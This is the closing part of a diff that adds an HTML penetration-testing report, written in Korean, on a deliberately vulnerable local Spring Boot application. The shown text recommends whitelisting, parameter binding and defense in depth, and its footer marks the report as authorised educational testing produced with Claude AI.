+          <strong>화이트리스트 방식과 파라미터 바인딩이 유일한 근본 해결책</strong>입니다.
+          보안은 여러 계층에서 동시에 적용되어야 하며(Defense in Depth), 한 계층이 뚫려도 다음 계층이 피해를 최소화합니다.
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- FOOTER -->
+<div style="border-top:1px solid var(--border);padding:24px 48px;display:flex;justify-content:space-between;align-items:center;color:var(--dim);font-size:12px;max-width:1280px;margin:0 auto;">
+  <div>
+    <strong style="color:var(--text)">VulnSpringApp 침투 분석 보고서</strong><br/>
+    교육 목적 · 로컬 환경 · Authorized Testing Only · Spring Boot 2.7.18 + H2
+  </div>
+  <div style="text-align:right;">
+    생성일: 2026-08-18<br/>
+    분석 엔진: Claude AI (Anthropic)<br/>
+    대상: http://localhost:8082/nas
+  </div>
+</div>
+
+</body>
+</html>
